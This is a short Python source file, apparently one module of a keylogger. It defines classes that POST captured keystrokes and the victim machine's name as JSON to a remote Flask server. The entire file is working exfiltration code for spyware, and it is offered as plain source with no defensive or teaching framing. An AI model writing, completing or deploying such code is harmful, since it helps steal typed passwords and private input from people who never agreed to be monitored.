from abc import ABC, abstractmethod
import requests

class BaseDataSender(ABC):
    """
    Abstract class for sending encrypted keystroke data.

    This class defines the interface for sending keystroke data to a remote location.
    """

    @abstractmethod
    def send_data(self, data: str, machine_name: str) -> None:
        """Sends encrypted keystroke data to a remote destination."""
        pass


class ServerSender(BaseDataSender):
    """
    Concrete implementation of the BaseDataSender.

    This class sends encrypted keystroke data to a Flask-based remote server.
    """

    def __init__(self, server_url: str):
        """Initializes the server sender with a specified URL endpoint."""
        self.server_url = server_url

    def send_data(self, data: str, machine_name: str) -> None:
        """Sends encrypted data as a JSON request to the remote server."""
        payload = {
            "machine": machine_name,
            "keystrokes": data
        }
        try:
            response = requests.post(self.server_url, json=payload)
            print(f"Server Response: {response.status_code}, {response.text}")
        except requests.RequestException as e:
            print(f"Error sending data to server: {e}")
